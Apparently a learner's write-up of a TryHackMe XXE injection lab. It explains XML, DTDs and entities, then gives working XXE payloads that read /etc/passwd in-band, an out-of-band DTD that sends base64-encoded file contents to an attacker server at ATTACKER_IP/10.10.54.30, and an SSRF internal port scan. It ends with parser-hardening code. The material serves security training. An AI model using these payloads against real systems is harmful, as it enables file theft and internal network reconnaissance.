#xxe #xml #xslt

https://tryhackme.com/room/xxeinjection

## Exploring XML

### What is XML?

XML (Extensible Markup Language) is a markup language derived from SGML (Standard Generalized Markup Language), which is the same standard that HTML is based on. XML is typically used by applications to store and transport data in a format that's both human-readable and machine-parseable. It's a flexible and widely used format for exchanging data between different systems and applications. XML consists of elements, attributes, and character data, which are used to represent data in a structured and organized way.

### XML Syntax and Structure

XML elements are represented by tags, which are surrounded by angle brackets (<>). Tags usually come in pairs, with the opening tag preceding the content and the closing tag following the content. For example:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<user id="1">
   <name>John</name>
   <age>30</age>
   <address>
      <street>123 Main St</street>
      <city>Anytown</city>
   </address>
</user>
```

The tag `<name>John</name>` represents an element named "name" with the content "John". Attributes provide additional information about elements and are specified within the opening tag. The tag `<user id="1">` specifies an attribute "id" with the value "1" for the element "user". Character data refers to the content within elements, such as "John".

The example above shows a simple XML document with elements, attributes, and character data. The tag `<?xml version="1.0" encoding="UTF-8"?>` declaration indicates the XML version, and the element contains various sub-elements and attributes representing user data.

### Common Use Cases in Web Applications

XML is widely used in web applications for data exchange, storage, and configuration. It's often used for web services and APIs, such as SOAP and REST, to exchange data between systems. XML is also used for configuration files, such as web server configurations or application settings.

### What is XSLT?

XSLT (Extensible Stylesheet Language Transformations) is a language used to transform and format XML documents. While XSLT is primarily used for data transformation and formatting, it is also significantly relevant to XXE (XML External Entities) attacks.

XSLT can be used to facilitate XXE attacks in several ways:  

1. **Data Extraction**: XSLT can be used to extract sensitive data from an XML document, which can then be used in an XXE attack. For example, an XSLT stylesheet can extract user credentials or other sensitive information from an XML file.
2. **Entity Expansion**: XSLT can expand entities defined in an XML document, including external entities. This can allow an attacker to inject malicious entities, leading to an XXE vulnerability.
3. **Data Manipulation**: XSLT can manipulate data in an XML document, potentially allowing an attacker to inject malicious data or modify existing data to exploit an XXE vulnerability.
4. **Blind XXE**: XSLT can be used to perform blind XXE attacks, in which an attacker injects malicious entities without seeing the server's response.

### What are DTDs?

DTDs or Document Type Definitions define the structure and constraints of an XML document. They specify the allowed elements, attributes, and relationships between them. DTDs can be internal within the XML document or external in a separate file.

Purpose and usage of DTDs:

- **Validation**: DTDs validate the structure of XML to ensure it meets specific criteria before processing, which is crucial in environments where data integrity is key.
- **Entity Declaration**: DTDs define entities that can be used throughout the XML document, including external entities which are key in XXE attacks.  
    

Internal DTDs are specified using the `<!DOCTYPE` declaration, while external DTDs are referenced using the SYSTEM keyword.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE config [
<!ELEMENT config (database)>
<!ELEMENT database (username, password)>
<!ELEMENT username (#PCDATA)>
<!ELEMENT password (#PCDATA)>
]>
<config>
<!-- configuration data -->
</config>
```

The example above shows an internal DTD defining the structure of a configuration file. The `<!ELEMENT declarations specify the allowed elements and their relationships. 


### DTDs and XXE

DTDs play a crucial role in XXE injection, as they can be used to declare external entities. External entities can reference external files or URLs, which can lead to malicious data or code injection.

### XML Entities

XML entities are placeholders for data or code that can be expanded within an XML document. There are five types of entities: internal entities, external entities, parameter entities, general entities, and character entities.

Example external entity:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY external SYSTEM "http://example.com/test.dtd">
<config>
&external;
</config>
```

This shows an external entity referencing a URL. The `&external;` reference within the XML document will be expanded to the contents of the referenced URL.

### Types of Entities

1. Internal Entities are essentially variables used within an XML document to define and substitute content that may be repeated multiple times. They are defined in the DTD (Document Type Definition) and can simplify the management of repetitive information. For example:
    
    ```xml
    <!DOCTYPE note [
    <!ENTITY inf "This is a test.">
    ]>
    <note>
            <info>&inf;</info>
    </note>
    ```
    
    In this example, the `&inf;` entity is replaced by its value wherever it appears in the document.
    
2. External Entities are similar to internal entities, but their contents are referenced from outside the XML document, such as from a separate file or URL. This feature can be exploited in XXE (XML External Entity) attacks if the XML processor is configured to resolve external entities. For example:
    
    ```xml
    <!DOCTYPE note [
    <!ENTITY ext SYSTEM "http://example.com/external.dtd">
    ]>
    <note>
            <info>&ext;</info>
    </note>
    ```
    
    Here, `&ext;` pulls content from the specified URL, which could be a security risk if the URL is controlled by an attacker.
    
3. Parameter Entities are special types of entities used within DTDs to define reusable structures or to include external DTD subsets. They are particularly useful for modularizing DTDs and for maintaining large-scale XML applications. For example:
    
    ```xml
    <!DOCTYPE note [
    <!ENTITY % common "CDATA">
    <!ELEMENT name (%common;)>
    ]>
    <note>
            <name>John Doe</name>
    </note>
    ```
    
    In this case, `%common;` is used within the DTD to define the type of data that the `name` element should contain.
    
4. General Entities are similar to variables and can be declared either internally or externally. They are used to define substitutions that can be used within the body of the XML document. Unlike parameter entities, general entities are intended for use in the document content. For example:
    
    ```xml
    <!DOCTYPE note [
    <!ENTITY author "John Doe">
    ]>
    <note>
            <writer>&author;</writer>
    </note>
    ```
    
    The entity `&author;` is a general entity used to substitute the author's name wherever it's referenced in the document.
    
5. Character Entities are used to represent special or reserved characters that cannot be used directly in XML documents. These entities prevent the parser from misinterpreting XML syntax. For example:
    
    - `&lt;` for the less-than symbol (`<`)
    - `&gt;` for the greater-than symbol (`>`)
    - `&amp;` for the ampersand (`&`)
    
    ```xml
    <note>
            <text>Use &lt; to represent a less-than symbol.</text>
    </note>
    ```
    
    This usage ensures that the special characters are processed correctly by the XML parser without breaking the document's structure.
    

The image below shows the type of entities in a DOM structure:

## XML Parsing Mechanisms

### XML Parsing

XML parsing is the process by which an XML file is read, and its information is accessed and manipulated by a software program. XML parsers convert data from XML format into a structure that a program can use (like a DOM tree). During this process, parsers may validate XML data against a schema or a DTD, ensuring the structure conforms to certain rules.

If a parser is configured to process external entities, it can lead to unauthorized access to files, internal systems, or external websites.

### Common XML Parsers

Several XML parsers are used across different programming environments; each parser may handle XML data differently, which can affect vulnerability to XXE injection.

- **DOM (Document Object Model) Parser**: This method builds the entire XML document into a memory-based tree structure, allowing random access to all parts of the document. It is resource-intensive but very flexible.
- **SAX (Simple API for XML) Parser**: Parses XML data sequentially without loading the whole document into memory, making it suitable for large XML files. However, it is less flexible for accessing XML data randomly.
- **StAX (Streaming API for XML) Parser**: Similar to SAX, StAX parses XML documents in a streaming fashion but gives the programmer more control over the XML parsing process.
- **XPath Parser**: Parses an XML document based on expression and is used extensively in conjunction with XSLT.

## Exploiting XXE - In-Band

### In-Band vs Out-of-Band XXE

In-band XXE refers to an XXE vulnerability where the attacker can see the response from the server. This allows for straightforward data exfiltration and exploitation. The attacker can simply send a malicious XML payload to the application, and the server will respond with the extracted data or the result of the attack.

Out-of-band XXE, on the other hand, refers to an XXE vulnerability where the attacker cannot see the response from the server. This requires using alternative channels, such as DNS or HTTP requests, to exfiltrate data. To extract the data, the attacker must craft a malicious XML payload that will trigger an out-of-band request, such as a DNS query or an HTTP request.

```html
POST /contact_submit.php HTTP/1.1
Host: 10.10.173.206
Content-Length: 129
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Content-Type: application/xml
Accept: */*
Origin: http://10.10.173.206
Referer: http://10.10.173.206/contact.php
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9
Connection: keep-alive

<?xml version="1.0" encoding="UTF-8"?><contact><name>xpc</name><email>xpc@xpc.com</email><message>xpc message</message></contact>
```


```xml
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<contact>
<name>&xxe;</name>
<email>test@test.com</email>
<message>test</message>
</contact>
```

```http
HTTP/1.1 200 OK
Date: Thu, 06 Mar 2025 02:14:40 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1977
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

Thank you, root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
tryhackme:x:1001:1001:,,,:/home/tryhackme:/bin/bash
mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false
! Your message has been received.
```



### XML Entity Expansion

XML Entity Expansion is a technique often used in XXE attacks that involves defining entities within an XML document, which the XML parser then expands. Attackers can abuse this feature by creating recursive or excessively large entities, leading to a Denial of Service (DoS) attack or defining external entities referencing sensitive files or services. This method is central to both in-band and out-of-band XXE, as it allows attackers to inject malicious entities into the XML data. For example:

```xml
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe "This is a test message" >]>
<contact><name>&xxe; &xxe;
</name><email>test@test.com</email><message>test</message></contact>
```

In the payload above, `&xxe;` is expanded wherever it appears. Attackers can use entity expansion to perform a Billion Laughs attack, where a small XML document recursively expands to consume server resources, leading to a denial of service.

```
Thank you, This is a test message This is a test message
! Your message has been received.
```

## Exploiting XXE - Out-of-Band

### Out-Of-Band XXE

On the other hand, to demonstrate this vulnerability, go to [http://10.10.173.206/index.php](http://10.10.173.206/index.php). The application uses the below code when a user uploads a file:

```php
libxml_disable_entity_loader(false);
$xmlData = file_get_contents('php://input'); 

$doc = new DOMDocument();
$doc->loadXML($xmlData, LIBXML_NOENT | LIBXML_DTDLOAD);

$links = $doc->getElementsByTagName('file');

foreach ($links as $link) {
    $fileLink = $link->nodeValue;
    $stmt = $conn->prepare("INSERT INTO uploads (link, uploaded_date) VALUES (?, NOW())");
    $stmt->bind_param("s", $fileLink);
    $stmt->execute();
    
    if ($stmt->affected_rows > 0) {
        echo "Link saved successfully.";
    } else {
        echo "Error saving link.";
    }
    
    $stmt->close();
}
```

The code above doesn't return the values of the submitted XML data. Hence, the term Out-of-Band since the exfiltrated data has to be captured using an attacker-controlled server.

For this attack, we will need a server that will receive data from other servers. You can use Python's http.server module, although there are options out there, like Apache or Nginx. Using AttackBox or your own machine, start a Python web server by using the command:

Starting a Python Webserver

```shell-session
user@tryhack $ python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
```

Upload a file in the application and monitor the request that is sent to `submit.php` using your Burp. Forward the request below to Burp Repeater.


Using the payload below, replace the value of the XML file in the request and resend it. Note that you have to replace the ATTACKER_IP variable with your own IP.

```xml
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://ATTACKER_IP:1337/" >]>
<upload><file>&xxe;</file></upload>
```

```xml
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://10.10.54.30:1337/" >]>
<upload><file>&xxe;</file></upload>
```

```
root@ip-10-10-54-30:~# python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
10.10.173.206 - - [06/Mar/2025 02:27:55] "GET / HTTP/1.0" 200 -

```

sample.dtd en la maquina atacante
```
<!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://10.10.54.30:1337/?data=%cmd;'>">
%oobxxe;
```

 
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE upload SYSTEM "http://10.10.54.30:1337/sample.dtd">
<upload>
    <file>&exfil;</file>
</upload>
```

```
python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
10.10.173.206 - - [06/Mar/2025 02:53:05] "GET /sample.dtd HTTP/1.0" 200 -
10.10.173.206 - - [06/Mar/2025 02:53:05] "GET /?data=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMDoxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMToxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC10aW1lc3luYzp4OjEwMjoxMDQ6c3lzdGVtZCBUaW1lIFN5bmNocm9uaXphdGlvbiwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDY6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXNsb2c6eDoxMDQ6MTEwOjovaG9tZS9zeXNsb2c6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwNTo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnRzczp4OjEwNjoxMTE6VFBNIHNvZnR3YXJlIHN0YWNrLCwsOi92YXIvbGliL3RwbTovYmluL2ZhbHNlCnV1aWRkOng6MTA3OjExMjo6L3J1bi91dWlkZDovdXNyL3NiaW4vbm9sb2dpbgp0Y3BkdW1wOng6MTA4OjExMzo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnNzaGQ6eDoxMDk6NjU1MzQ6Oi9ydW4vc3NoZDovdXNyL3NiaW4vbm9sb2dpbgpsYW5kc2NhcGU6eDoxMTA6MTE1OjovdmFyL2xpYi9sYW5kc2NhcGU6L3Vzci9zYmluL25vbG9naW4KcG9sbGluYXRlOng6MTExOjE6Oi92YXIvY2FjaGUvcG9sbGluYXRlOi9iaW4vZmFsc2UKZWMyLWluc3RhbmNlLWNvbm5lY3Q6eDoxMTI6NjU1MzQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk5Ojk5OTpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KdWJ1bnR1Ong6MTAwMDoxMDAwOlVidW50dTovaG9tZS91YnVudHU6L2Jpbi9iYXNoCmx4ZDp4Ojk5ODoxMDA6Oi92YXIvc25hcC9seGQvY29tbW9uL2x4ZDovYmluL2ZhbHNlCnRyeWhhY2ttZTp4OjEwMDE6MTAwMTosLCw6L2hvbWUvdHJ5aGFja21lOi9iaW4vYmFzaApteXNxbDp4OjExMzoxMTk6TXlTUUwgU2VydmVyLCwsOi9ub25leGlzdGVudDovYmluL2ZhbHNlCg== HTTP/1.0" 200 -

```

## SSRF + XXE

**Server-Side Request Forgery (SSRF)** attacks occur when an attacker abuses functionality on a server, causing the server to make requests to an unintended location. In the context of XXE, an attacker can manipulate XML input to make the server issue requests to internal services or access internal files. This technique can be used to scan internal networks, access restricted endpoints, or interact with services that are only accessible from the server’s local network.

### Internal Network Scanning

Consider a scenario where a vulnerable server hosts another web application internally on a non-standard port. An attacker can exploit an XXE vulnerability that makes the server send a request to its own internal network resource.

For example, using the captured request from the in-band XXE task, send the captured request to Burp Intruder and use the payload below:

```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "http://localhost:§10§/" >
]>
<contact>
  <name>&xxe;</name>
  <email>test@test.com</email>
  <message>test</message>
</contact>
```

The external entity is set to fetch data from `http://localhost:§10§/`. Intruder will then reiterate the request and search for an internal service running on the server.

**Steps to brute force for open ports:**

1. Once the captured request from the In-Band XXE is in Intruder, click the Add `§` button while highlighting the port.
2. In the Payloads tab, set the payload type to Numbers with the Payload settings from 1 to 65535.
3. Once done, click the Start attack button and click the Length column to sort which item has the largest size. The difference in the server's response size is worth further investigation since it might contain information that is different compared to the other intruder requests.

```xml
POST /contact_submit.php HTTP/1.1
Host: 10.10.252.187
Content-Length: 125
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Content-Type: application/xml
Accept: */*
Origin: http://10.10.252.187
Referer: http://10.10.252.187/contact.php
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9
Connection: keep-alive

<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "http://localhost:1/" >
]>
<contact>
  <name>&xxe;</name>
  <email>test@test.com</email>
  <message>test</message>
</contact>

```

```
HTTP/1.1 200 OK
Date: Thu, 06 Mar 2025 16:28:19 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 95
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

Thank you, Can you exfiltrate the flag?

Flag: THM{0O8_xx3!!}
! Your message has been received.
```



**How the Server Processes This**:

The entity `&xxe;` is referenced within the `<name>` tag, triggering the server to make an HTTP request to the specified URL when the XML is parsed. The response of the requested resource will then be included in the server response. If an application contains secret keys, API keys, or hardcoded passwords, this information can then be used in another form of attack, such as password reuse.

### Potential Security Implications

- **Reconnaissance**: Attackers can discover services running on internal network ports and gain insights into the server's internal architecture.
- **Data Leakage**: If the internal service returns sensitive information, it could be exposed externally through errors or XML data output.
- **Elevation of Privilege**: Accessing internal services could lead to further exploits, potentially escalating an attacker's capabilities within the network.


## Mitigation


### Avoiding Misconfigurations

Misconfigurations in XML parser settings are a common cause of XXE-related vulnerabilities. Adjusting these settings can significantly reduce the risk of XXE attacks. Below are detailed guidelines and best practices for several popular programming languages and frameworks.

### General Best Practices

1. **Disable External Entities and DTDs**: As a best practice, disable the processing of external entities and DTDs in your XML parsers. Most XXE vulnerabilities arise from malicious DTDs.
2. **Use Less Complex Data Formats**: Where possible, consider using simpler data formats like JSON, which do not allow the specification of external entities.
3. **Allowlisting Input Validation**: Validate all incoming data against a strict schema that defines expected data types and patterns. Exclude or escape XML-specific characters such as <, >, &, ', and ". These characters are crucial in XML syntax and can lead to injection attacks if misused.
### Mitigation Techniques in Popular Languages

**Java**

Use the `DocumentBuilderFactory` and disable DTDs:

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
DocumentBuilder db = dbf.newDocumentBuilder();
```

**.NET**

Configure XML readers to ignore DTDs and external entities:

```csharp
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
settings.XmlResolver = null;
XmlReader reader = XmlReader.Create(stream, settings);
```

**PHP**

Disable loading external entities by libxml:

```php
libxml_disable_entity_loader(true);
```

**Python**

Use `defusedxml` library, which is designed to mitigate XML vulnerabilities:

```python
from defusedxml.ElementTree import parse
et = parse(xml_input)
```

### Regularly Update and Patch

- **Software Updates**: Keep all XML processors and libraries up-to-date. Vendors frequently patch known vulnerabilities.
- **Security Patches**: Regularly apply security patches to web applications and their environments.

### Security Awareness and Code Reviews

- **Conduct Code Reviews**: Regularly review code for security vulnerabilities, especially code that handles XML input and parsing.
- **Promote Security Training**: Ensure developers are aware of secure coding practices, including the risks associated with XML parsing.

## Conclusion

### Conclusion

XXE (XML External Entities) attacks arise from improper handling of user-supplied input in web applications, particularly in XML parsing. Attackers exploit vulnerable XML processors to inject malicious external entities, leading to data exfiltration, server compromise, or denial of service. XXE vulnerabilities can be prevented by disabling external entity expansion, validating user input, and using secure XML parsing libraries. Additionally, implementing security best practices such as input validation, output encoding, and secure coding practices can significantly reduce the risk of XXE attacks. Regular security audits, code reviews, and training on secure development practices are essential for identifying and mitigating XXE vulnerabilities. By understanding the risks and taking proactive measures, developers and administrators can protect their web applications from XXE attacks and ensure the security and integrity of their systems.

### Recap of Key Concepts Covered in the Room

In this training room, we've covered a comprehensive range of topics related to XXE (XML External Entity) vulnerabilities, which are critical in understanding how these vulnerabilities can impact web security. Here's a quick recap:

- **Understanding XML**: We explored the basics of XML syntax and structure, including the use of DTDs and how they can be exploited.
- **XML Parsing Mechanisms**: We discussed different XML parsers and their configurations, emphasizing secure practices.
- **Exploiting XXE**: Detailed steps were provided to exploit XXE vulnerabilities, ranging from basic data exfiltration to advanced techniques like Out-of-Band XXE.
- **XXE+SSRF**: We explored the concept of SSRF attacks via XXE for Out-of-Band data exfiltration and how to scan internal networks using this attack.
- **Mitigation**: Strategies to prevent XXE vulnerabilities were outlined, focusing on avoiding misconfigurations and reinforcing secure coding practices.